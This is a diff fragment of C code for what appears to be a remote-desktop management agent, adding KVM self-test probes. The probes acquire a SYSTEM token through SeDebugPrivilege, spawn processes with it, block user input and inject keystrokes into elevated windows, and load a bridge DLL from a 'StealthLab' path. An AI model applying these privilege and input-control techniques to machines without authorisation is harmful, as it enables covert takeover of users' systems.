+			Sleep(50);
+		}
+		MeshService_BuildWindowSnapshotForSessionW(sessionId, probeDesktop, windowSnapshot, _countof(windowSnapshot));
+		targetStateReady = MeshService_QueryProcessSecurityState(targetProcess.dwProcessId, NULL, &targetIntegrityRid, &targetElevationType, &targetSessionId);
+		targetHighIntegrity = (targetStateReady && targetIntegrityRid >= SECURITY_MANDATORY_HIGH_RID);
+	}
+
+	if (targetSpawned && targetStateReady && targetHighIntegrity &&
+		GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
+		SUCCEEDED(StringCchPrintfW(
+			blockerArgs,
+			_countof(blockerArgs),
+			L"-kvm-blockinput-holder \"%ls\" \"%ls\" \"%ls\"",
+			blockerReadyPath,
+			blockerReleasePath,
+			blockerReportPath)))
+	{
+		blockerSpawned = MeshService_SpawnProcessWithTokenW(elevatedToken, blockerArgs, L"winsta0\\default", &blockerProcess, &blockerSpawnError);
+	}
+
+	if (blockerSpawned)
+	{
+		blockerReady = MeshService_WaitForFilePresenceW(blockerReadyPath, 10000, &blockerReadyMs);
+	}
+	if (blockerReady)
+	{
+		Sleep(500);
+		inputSent = MeshService_KvmTypeMarkerVirtualText(marker, MeshService_KvmSessionChangeProbeWriteSink, &state);
+	}
+
+	if (inputSent)
+	{
+		targetWaitResult = WaitForSingleObject(targetProcess.hProcess, 10000);
+		targetExited = (targetWaitResult == WAIT_OBJECT_0);
+	}
+	if (targetExited)
+	{
+		capturedText = MeshService_ReadUtf8TextFileW(capturePath);
+		if (capturedText != NULL)
+		{
+			MeshService_TrimLineEndingsA(capturedText);
+			capturedMatches = (strcmp(capturedText, marker) == 0);
+		}
+	}
+
+	if (blockerSpawned)
+	{
+		blockerReleaseWritten = MeshService_WriteWideTextFileUtf8W(blockerReleasePath, L"RELEASE");
+		blockerWaitResult = WaitForSingleObject(blockerProcess.hProcess, 10000);
+		blockerExited = (blockerWaitResult == WAIT_OBJECT_0);
+		if (!blockerExited)
+		{
+			TerminateProcess(blockerProcess.hProcess, 1);
+			WaitForSingleObject(blockerProcess.hProcess, 2000);
+			blockerWaitResult = WaitForSingleObject(blockerProcess.hProcess, 0);
+			blockerExited = (blockerWaitResult == WAIT_OBJECT_0);
+		}
+		if (blockerExited)
+		{
+			GetExitCodeProcess(blockerProcess.hProcess, &blockerExitCode);
+		}
+		blockerJson = MeshService_ReadUtf8TextFileW(blockerReportPath);
+		blockerReportAvailable = (blockerJson != NULL);
+		blockerSuccess = MeshService_JsonFieldTrueA(blockerJson, "success");
+		blockerBlockInputEnabled = MeshService_JsonFieldTrueA(blockerJson, "blockInputEnabled");
+		blockerSameThreadSendInputSucceeded = MeshService_JsonFieldTrueA(blockerJson, "sameThreadSendInputSucceeded");
+	}
+
+	if (targetProcess.hProcess != NULL && !targetExited)
+	{
+		TerminateProcess(targetProcess.hProcess, 1);
+		WaitForSingleObject(targetProcess.hProcess, 2000);
+	}
+	if (relayStarted)
+	{
+		kvm_cleanup(&state);
+		kvm_set_force_default_desktop(0);
+		if (bridgePid != 0)
+		{
+			cleanupExited = MeshService_WaitForProcessExitById(bridgePid, 5000, &bridgeExitMs);
+		}
+		else
+		{
+			cleanupExited = TRUE;
+		}
+		Sleep(250);
+	}
+	else
+	{
+		kvm_set_force_default_desktop(0);
+	}
+
+	success =
+		relayStarted &&
+		bridgeSpawned &&
+		bridgePacketsReady &&
+		bridgeUsed &&
+		!fallbackUsed &&
+		bridgeStateReady &&
+		bridgeSystemSid &&
+		bridgeIntegrityRid >= SECURITY_MANDATORY_SYSTEM_RID &&
+		bridgeSessionId == sessionId &&
+		elevatedTokenReady &&
+		targetSpawned &&
+		targetStateReady &&
+		targetHighIntegrity &&
+		targetSessionId == sessionId &&
+		blockerSpawned &&
+		blockerReady &&
+		blockerReportAvailable &&
+		blockerSuccess &&
+		blockerBlockInputEnabled &&
+		blockerSameThreadSendInputSucceeded &&
+		inputSent &&
+		targetExited &&
+		capturedMatches &&
+		blockerExited &&
+		cleanupExited;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-blockinput-probe\",");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
+	printf("\"bridgeSpawned\":%s,", bridgeSpawned ? "true" : "false");
+	printf("\"bridgePacketsReady\":%s,", bridgePacketsReady ? "true" : "false");
+	printf("\"bridgeUsed\":%s,", bridgeUsed ? "true" : "false");
+	printf("\"fallbackUsed\":%s,", fallbackUsed ? "true" : "false");
+	printf("\"bridgePid\":%lu,", (unsigned long)bridgePid);
+	printf("\"bridgeSpawnMs\":%lu,", (unsigned long)bridgeSpawnMs);
+	printf("\"bridgePacketMs\":%lu,", (unsigned long)bridgePacketMs);
+	printf("\"bridgeStateReady\":%s,", bridgeStateReady ? "true" : "false");
+	printf("\"bridgeSystemSid\":%s,", bridgeSystemSid ? "true" : "false");
+	printf("\"bridgeIntegrityRid\":%lu,", (unsigned long)bridgeIntegrityRid);
+	printf("\"bridgeElevationType\":%lu,", (unsigned long)bridgeElevationType);
+	printf("\"bridgeSessionId\":%lu,", (unsigned long)bridgeSessionId);
+	printf("\"probeWindowStationBound\":%s,", probeWindowStationBound ? "true" : "false");
+	printf("\"probeWindowStationError\":%lu,", (unsigned long)probeWindowStationError);
+	printf("\"probeDesktopBound\":%s,", probeDesktopBound ? "true" : "false");
+	printf("\"probeDesktopError\":%lu,", (unsigned long)probeDesktopError);
+	printf("\"probeDesktop\":\""); MeshService_PrintJsonEscapedWide(probeDesktop); printf("\",");
+	printf("\"targetDesktop\":\""); MeshService_PrintJsonEscapedWide(targetDesktop); printf("\",");
+	printf("\"elevatedTokenReady\":%s,", elevatedTokenReady ? "true" : "false");
+	printf("\"elevatedTokenError\":%lu,", (unsigned long)elevatedTokenError);
+	printf("\"targetSpawned\":%s,", targetSpawned ? "true" : "false");
+	printf("\"targetSpawnError\":%lu,", (unsigned long)targetSpawnError);
+	printf("\"targetPid\":%lu,", (unsigned long)targetProcess.dwProcessId);
+	printf("\"targetReady\":%s,", targetReady ? "true" : "false");
+	printf("\"targetReadyMs\":%lu,", (unsigned long)targetReadyMs);
+	printf("\"targetWindowReported\":%s,", targetWindowReported ? "true" : "false");
+	printf("\"targetWindowReportMs\":%lu,", (unsigned long)targetWindowReportMs);
+	printf("\"targetWindowFound\":%s,", targetWindowFound ? "true" : "false");
+	printf("\"targetWindowMs\":%lu,", (unsigned long)targetWindowMs);
+	printf("\"targetFocused\":%s,", targetFocused ? "true" : "false");
+	printf("\"targetStateReady\":%s,", targetStateReady ? "true" : "false");
+	printf("\"targetIntegrityRid\":%lu,", (unsigned long)targetIntegrityRid);
+	printf("\"targetElevationType\":%lu,", (unsigned long)targetElevationType);
+	printf("\"targetHighIntegrity\":%s,", targetHighIntegrity ? "true" : "false");
+	printf("\"targetSessionId\":%lu,", (unsigned long)targetSessionId);
+	printf("\"blockerSpawned\":%s,", blockerSpawned ? "true" : "false");
+	printf("\"blockerSpawnError\":%lu,", (unsigned long)blockerSpawnError);
+	printf("\"blockerReady\":%s,", blockerReady ? "true" : "false");
+	printf("\"blockerReadyMs\":%lu,", (unsigned long)blockerReadyMs);
+	printf("\"blockerReleaseWritten\":%s,", blockerReleaseWritten ? "true" : "false");
+	printf("\"blockerExited\":%s,", blockerExited ? "true" : "false");
+	printf("\"blockerWaitResult\":%lu,", (unsigned long)blockerWaitResult);
+	printf("\"blockerExitCode\":%lu,", (unsigned long)blockerExitCode);
+	printf("\"blockerReportAvailable\":%s,", blockerReportAvailable ? "true" : "false");
+	printf("\"blockerSuccess\":%s,", blockerSuccess ? "true" : "false");
+	printf("\"blockerBlockInputEnabled\":%s,", blockerBlockInputEnabled ? "true" : "false");
+	printf("\"blockerSameThreadSendInputSucceeded\":%s,", blockerSameThreadSendInputSucceeded ? "true" : "false");
+	printf("\"inputSent\":%s,", inputSent ? "true" : "false");
+	printf("\"targetExited\":%s,", targetExited ? "true" : "false");
+	printf("\"targetWaitResult\":%lu,", (unsigned long)targetWaitResult);
+	printf("\"capturedMatches\":%s,", capturedMatches ? "true" : "false");
+	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
+	printf("\"bridgeExitMs\":%lu,", (unsigned long)bridgeExitMs);
+	printf("\"windowTitle\":\""); MeshService_PrintJsonEscapedWide(windowTitle); printf("\",");
+	printf("\"windowSnapshot\":\""); MeshService_PrintJsonEscapedWide(windowSnapshot); printf("\",");
+	printf("\"marker\":\""); MeshService_PrintJsonEscapedUtf8(marker); printf("\",");
+	printf("\"capturedText\":\""); MeshService_PrintJsonEscapedUtf8(capturedText != NULL ? capturedText : ""); printf("\",");
+	printf("\"targetExePath\":\""); MeshService_PrintJsonEscapedWide(targetExePath); printf("\",");
+	printf("\"hwndReportPath\":\""); MeshService_PrintJsonEscapedWide(hwndReportPath); printf("\",");
+	printf("\"readyPath\":\""); MeshService_PrintJsonEscapedWide(readyPath); printf("\",");
+	printf("\"capturePath\":\""); MeshService_PrintJsonEscapedWide(capturePath); printf("\",");
+	printf("\"blockerReadyPath\":\""); MeshService_PrintJsonEscapedWide(blockerReadyPath); printf("\",");
+	printf("\"blockerReleasePath\":\""); MeshService_PrintJsonEscapedWide(blockerReleasePath); printf("\",");
+	printf("\"blockerReportPath\":\""); MeshService_PrintJsonEscapedWide(blockerReportPath); printf("\",");
+	printf("\"blocker\":%s}\n", blockerJson != NULL ? blockerJson : "null");
+	fflush(stdout);
+
+	if (blockerProcess.hThread != NULL) { CloseHandle(blockerProcess.hThread); }
+	if (blockerProcess.hProcess != NULL) { CloseHandle(blockerProcess.hProcess); }
+	if (targetProcess.hThread != NULL) { CloseHandle(targetProcess.hThread); }
+	if (targetProcess.hProcess != NULL) { CloseHandle(targetProcess.hProcess); }
+	if (elevatedToken != NULL) { CloseHandle(elevatedToken); }
+	if (blockerJson != NULL) { free(blockerJson); }
+	if (capturedText != NULL) { free(capturedText); }
+	DeleteFileW(hwndReportPath);
+	DeleteFileW(readyPath);
+	DeleteFileW(capturePath);
+	DeleteFileW(blockerReadyPath);
+	DeleteFileW(blockerReleasePath);
+	DeleteFileW(blockerReportPath);
+	if (chain != NULL) { ILibStopChain(chain); }
+	if (chainThread != NULL)
+	{
+		WaitForSingleObject(chainThread, 5000);
+		CloseHandle(chainThread);
+	}
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmBlockInputProbeChildCommand(const WCHAR* reportPath)
+{
+	FILE* redirectedStdout = NULL;
+	errno_t redirectError = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
+		if (redirectError != 0 || redirectedStdout == NULL)
+		{
+			return 1;
+		}
+	}
+	return MeshService_RunKvmBlockInputProbeWorkerCommand();
+}
+
+static int MeshService_RunKvmBlockInputProbeCommand(void)
+{
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR reportPath[MAX_PATH] = { 0 };
+	WCHAR arguments[512] = { 0 };
+	HANDLE systemToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD spawnError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	BOOL systemTokenReady = FALSE;
+	BOOL childSpawned = FALSE;
+	char* childJson = NULL;
+
+	if (MeshService_ProcessHasSystemSid())
+	{
+		return MeshService_RunKvmBlockInputProbeWorkerCommand();
+	}
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmBlockInputProbe_%lu.json", tempPath, GetCurrentProcessId());
+	DeleteFileW(reportPath);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-blockinput-probe-child \"%ls\"", reportPath);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
+	}
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 60000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(reportPath);
+	if (childJson != NULL)
+	{
+		printf("%s\n", childJson);
+	}
+	else
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
+			(unsigned long)sessionId,
+			systemTokenReady ? "true" : "false",
+			childSpawned ? "true" : "false",
+			(unsigned long)systemTokenError,
+			(unsigned long)spawnError,
+			(unsigned long)childExitCode);
+	}
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
+	if (childJson != NULL) { free(childJson); }
+	DeleteFileW(reportPath);
+	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
+}
+
+typedef struct MeshServiceKvmProbeChain
+{
+	void* chain;
+	void* pipeManager;
+	HANDLE chainThread;
+} MeshServiceKvmProbeChain;
+
+static void MeshService_KvmProbeChain_Init(MeshServiceKvmProbeChain* probeChain)
+{
+	if (probeChain == NULL) { return; }
+	ZeroMemory(probeChain, sizeof(MeshServiceKvmProbeChain));
+}
+
+static BOOL MeshService_KvmProbeChain_Start(MeshServiceKvmProbeChain* probeChain)
+{
+	if (probeChain == NULL) { return FALSE; }
+
+	probeChain->chain = ILibCreateChainEx(0);
+	if (probeChain->chain == NULL) { return FALSE; }
+
+	probeChain->pipeManager = ILibProcessPipe_Manager_Create(probeChain->chain);
+	if (probeChain->pipeManager == NULL)
+	{
+		ILibStopChain(probeChain->chain);
+		probeChain->chain = NULL;
+		return FALSE;
+	}
+
+	probeChain->chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, probeChain->chain, 0, NULL);
+	if (probeChain->chainThread == NULL)
+	{
+		ILibStopChain(probeChain->chain);
+		probeChain->pipeManager = NULL;
+		probeChain->chain = NULL;
+		return FALSE;
+	}
+
+	Sleep(200);
+	return TRUE;
+}
+
+static DWORD MeshService_KvmProbeChain_Stop(MeshServiceKvmProbeChain* probeChain)
+{
+	DWORD waitResult = WAIT_OBJECT_0;
+
+	if (probeChain == NULL) { return WAIT_OBJECT_0; }
+	if (probeChain->chain != NULL)
+	{
+		ILibStopChain(probeChain->chain);
+		probeChain->chain = NULL;
+		probeChain->pipeManager = NULL;
+	}
+	if (probeChain->chainThread != NULL)
+	{
+		waitResult = WaitForSingleObject(probeChain->chainThread, 5000);
+		CloseHandle(probeChain->chainThread);
+		probeChain->chainThread = NULL;
+	}
+	return waitResult;
+}
+
+static void MeshService_RestoreEnvironmentVariableW(const WCHAR* name, const WCHAR* previousValue, DWORD previousLen)
+{
+	if (name == NULL || name[0] == L'\0') { return; }
+	if (previousValue != NULL && previousLen > 0 && previousValue[0] != L'\0')
+	{
+		SetEnvironmentVariableW(name, previousValue);
+	}
+	else
+	{
+		SetEnvironmentVariableW(name, NULL);
+	}
+}
+
+static BOOL MeshService_GetCurrentBuildBridgeDllPathW(WCHAR* output, size_t outputLen)
+{
+	WCHAR modulePath[MAX_PATH * 4] = { 0 };
+	WCHAR dirPath[MAX_PATH * 4] = { 0 };
+	WCHAR parentDir[MAX_PATH * 4] = { 0 };
+	WCHAR baseName[MAX_PATH] = { 0 };
+	WCHAR nameNoExt[MAX_PATH] = { 0 };
+	WCHAR candidate[MAX_PATH * 4] = { 0 };
+	WCHAR* lastSlash = NULL;
+	WCHAR* ext = NULL;
+
+	if (output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+
+	if (GetModuleFileNameW(NULL, modulePath, (DWORD)_countof(modulePath)) == 0) { return FALSE; }
+	if (FAILED(StringCchCopyW(dirPath, _countof(dirPath), modulePath))) { return FALSE; }
+
+	lastSlash = wcsrchr(dirPath, L'\\');
+	if (lastSlash == NULL) { return FALSE; }
+	if (FAILED(StringCchCopyW(baseName, _countof(baseName), lastSlash + 1))) { return FALSE; }
+	*lastSlash = L'\0';
+
+	if (FAILED(StringCchCopyW(parentDir, _countof(parentDir), dirPath))) { return FALSE; }
+	lastSlash = wcsrchr(parentDir, L'\\');
+	if (lastSlash == NULL) { return FALSE; }
+	*lastSlash = L'\0';
+
+	if (FAILED(StringCchCopyW(nameNoExt, _countof(nameNoExt), baseName))) { return FALSE; }
+	ext = wcsrchr(nameNoExt, L'.');
+	if (ext != NULL) { *ext = L'\0'; }
+
+	if (FAILED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\StealthLab_DLL\\%ls.dll", parentDir, nameNoExt))) { return FALSE; }
+	if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { return FALSE; }
+
+	return SUCCEEDED(StringCchCopyW(output, outputLen, candidate));
+}
+
+static BOOL MeshService_WaitForKvmFailureCount(DWORD targetFailureCount, DWORD timeoutMs, DWORD* elapsedMsOut)
+{
+	ULONGLONG startTick = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	while ((GetTickCount64() - startTick) <= timeoutMs)
+	{
+		if (kvm_bridge_debug_get_consecutive_failures() >= targetFailureCount)
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - startTick); }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - startTick); }
+	return FALSE;
+}
+
+static int MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand(void)
+{
+	static const DWORD expectedBackoffMs[6] = { 2000, 4000, 8000, 16000, 32000, 60000 };
+	MeshServiceKvmProbeChain probeChain;
+	MeshServiceKvmSessionChangeProbeState state;
+	WCHAR bridgeDllPath[MAX_PATH * 4] = { 0 };
+	WCHAR missingExePath[MAX_PATH] = { 0 };
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR previousBridgeDll[MAX_PATH * 4] = { 0 };
+	WCHAR previousForceExitCode[64] = { 0 };
+	char missingExePathA[MAX_PATH * 4] = { 0 };
+	DWORD previousBridgeDllLen = 0;
+	DWORD previousForceExitCodeLen = 0;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD failureTimelineMs[6] = { 0 };
+	DWORD recordedBackoffMs[6] = { 0 };
+	DWORD failureStageSeries[6] = { 0 };
+	DWORD failureErrorSeries[6] = { 0 };
+	DWORD observedIntervalsMs[5] = { 0 };
+	BOOL retryScheduledSeries[6] = { FALSE };
+	DWORD spawnAttemptCount = 0;
+	DWORD cleanupSettleMs = 0;
+	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
+	ULONGLONG probeStartTick = 0;
+	int failureCount = 0;
+	int i = 0;
+	BOOL bridgeDllReady = FALSE;
+	BOOL chainStarted = FALSE;
+	BOOL relayStarted = FALSE;
+	BOOL cleanupSettled = FALSE;
+	BOOL success = FALSE;
+
+	MeshService_KvmProbeChain_Init(&probeChain);
+	ZeroMemory(&state, sizeof(state));
+
+	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-crash-recovery-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
+		fflush(stdout);
+		return 1;
+	}
+
+	bridgeDllReady = MeshService_GetCurrentBuildBridgeDllPathW(bridgeDllPath, _countof(bridgeDllPath));
+	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(missingExePath, _countof(missingExePath), L"%lsMeshMissingKvmChild_%lu.exe", tempPath, GetCurrentProcessId());
+	DeleteFileW(missingExePath);
+	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));
+
+	previousBridgeDllLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, (DWORD)_countof(previousBridgeDll));
+	if (previousBridgeDllLen >= _countof(previousBridgeDll)) { previousBridgeDllLen = 0; previousBridgeDll[0] = L'\0'; }
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
+
+	if (bridgeDllReady)
+	{
+		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
+	}
+	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
+
+	if (bridgeDllReady && chainStarted)
+	{
+		relayStarted = (kvm_relay_setup(missingExePathA, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	}
+	if (relayStarted)
+	{
+		probeStartTick = GetTickCount64();
+		while (failureCount < 6 && (GetTickCount64() - probeStartTick) <= 95000)
+		{
+			DWORD currentFailureCount = kvm_bridge_debug_get_consecutive_failures();
+
+			while (failureCount < 6 && currentFailureCount >= (DWORD)(failureCount + 1))
+			{
+				failureTimelineMs[failureCount] = (DWORD)(GetTickCount64() - probeStartTick);
+				recordedBackoffMs[failureCount] = kvm_bridge_debug_get_last_backoff_delay_ms();
+				failureStageSeries[failureCount] = kvm_bridge_debug_get_last_bridge_failure_stage();
+				failureErrorSeries[failureCount] = kvm_bridge_debug_get_last_bridge_failure_error();
+				retryScheduledSeries[failureCount] = (kvm_bridge_debug_is_retry_scheduled() != 0);
+				++failureCount;
+			}
+			Sleep(50);
+		}
+		spawnAttemptCount = kvm_bridge_debug_get_spawn_attempt_count();
+		kvm_cleanup(&state);
+		while (cleanupSettleMs < 2000)
+		{
+			if (kvm_bridge_debug_get_child_present() == 0 && kvm_bridge_debug_is_retry_scheduled() == 0)
+			{
+				cleanupSettled = TRUE;
+				break;
+			}
+			Sleep(50);
+			cleanupSettleMs += 50;
+		}
+	}
+
+	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, previousBridgeDllLen);
+	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
+
+	for (i = 1; i < failureCount && i < 6; ++i)
+	{
+		observedIntervalsMs[i - 1] = failureTimelineMs[i] - failureTimelineMs[i - 1];
+	}
+
+	success = bridgeDllReady && chainStarted && relayStarted && failureCount == 6 && spawnAttemptCount > 0 && cleanupSettled;
+	for (i = 0; i < failureCount && i < 6; ++i)
+	{
+		if (recordedBackoffMs[i] != expectedBackoffMs[i]) { success = FALSE; }
+		if (failureStageSeries[i] != 7) { success = FALSE; }
+		if (failureErrorSeries[i] != 193) { success = FALSE; }
+		if (!retryScheduledSeries[i]) { success = FALSE; }
+	}
+	for (i = 1; i < failureCount && i < 6; ++i)
+	{
+		DWORD lowerBound = (expectedBackoffMs[i - 1] > 250) ? (expectedBackoffMs[i - 1] - 250) : 0;
+		DWORD upperBound = expectedBackoffMs[i - 1] + 5000;
+		if (observedIntervalsMs[i - 1] < lowerBound || observedIntervalsMs[i - 1] > upperBound)
+		{
+			success = FALSE;
+		}
+	}
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-bridge-crash-recovery-probe\",");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"bridgeDllReady\":%s,", bridgeDllReady ? "true" : "false");
+	printf("\"chainStarted\":%s,", chainStarted ? "true" : "false");
+	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
+	printf("\"bridgeDllPath\":\""); MeshService_PrintJsonEscapedWide(bridgeDllPath); printf("\",");
+	printf("\"missingExePath\":\""); MeshService_PrintJsonEscapedWide(missingExePath); printf("\",");
+	printf("\"failureCount\":%d,", failureCount);
+	printf("\"spawnAttemptCount\":%lu,", (unsigned long)spawnAttemptCount);
+	printf("\"cleanupSettled\":%s,", cleanupSettled ? "true" : "false");
+	printf("\"cleanupSettleMs\":%lu,", (unsigned long)cleanupSettleMs);
+	printf("\"chainThreadWaitResult\":%lu,", (unsigned long)chainThreadWaitResult);
+	printf("\"expectedBackoffMs\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)expectedBackoffMs[i]);
+	}
+	printf("],");
+	printf("\"recordedBackoffMs\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)recordedBackoffMs[i]);
+	}
+	printf("],");
+	printf("\"failureTimelineMs\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)failureTimelineMs[i]);
+	}
+	printf("],");
+	printf("\"observedIntervalsMs\":[");
+	for (i = 0; i < 5; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)observedIntervalsMs[i]);
+	}
+	printf("],");
+	printf("\"failureStageSeries\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)failureStageSeries[i]);
+	}
+	printf("],");
+	printf("\"failureErrorSeries\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%lu", (unsigned long)failureErrorSeries[i]);
+	}
+	printf("],");
+	printf("\"retryScheduledSeries\":[");
+	for (i = 0; i < 6; ++i)
+	{
+		if (i != 0) { printf(","); }
+		printf("%s", retryScheduledSeries[i] ? "true" : "false");
+	}
+	printf("]}\n");
+	fflush(stdout);
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmBridgeCrashRecoveryProbeChildCommand(const WCHAR* reportPath)
+{
+	FILE* redirectedStdout = NULL;
+	errno_t redirectError = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
+		if (redirectError != 0 || redirectedStdout == NULL)
+		{
+			return 1;
+		}
+	}
+	return MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand();
+}
+
+static int MeshService_RunKvmBridgeCrashRecoveryProbeCommand(void)
+{
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR reportPath[MAX_PATH] = { 0 };
+	WCHAR arguments[512] = { 0 };
+	HANDLE systemToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD spawnError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	BOOL systemTokenReady = FALSE;
+	BOOL childSpawned = FALSE;
+	char* childJson = NULL;
+
+	if (MeshService_ProcessHasSystemSid())
+	{
+		return MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand();
+	}
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmCrashRecoveryProbe_%lu.json", tempPath, GetCurrentProcessId());
+	DeleteFileW(reportPath);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-crash-recovery-probe-child \"%ls\"", reportPath);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
+	}
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 150000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(reportPath);
+	if (childJson != NULL)
+	{
+		printf("%s\n", childJson);
+	}
+	else
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-crash-recovery-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
+			(unsigned long)sessionId,
+			systemTokenReady ? "true" : "false",
+			childSpawned ? "true" : "false",
+			(unsigned long)systemTokenError,
+			(unsigned long)spawnError,
+			(unsigned long)childExitCode);
+	}
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
